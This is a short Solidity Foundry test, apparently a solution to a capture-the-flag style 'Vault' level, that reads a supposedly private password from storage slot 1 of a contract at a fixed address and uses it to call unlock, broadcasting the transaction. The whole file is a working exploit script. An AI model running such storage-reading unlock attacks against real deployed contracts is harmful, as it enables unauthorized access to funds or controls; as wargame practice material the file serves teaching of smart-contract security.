// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../src/interfaces/8_IVault.sol";
address constant INSTANCE = 0xc34FdAB67BdE6133A7D94123e006E99e2cf9e9c2;

contract VaultPOCTest is Test {
    IVault instance = IVault(INSTANCE);

    function test() external {
        vm.startBroadcast();

        assertTrue(instance.locked());
        bytes32 password = vm.load(INSTANCE, 0x0000000000000000000000000000000000000000000000000000000000000001);

        instance.unlock(password);
        assertFalse(instance.locked());

        vm.stopBroadcast();
    }
}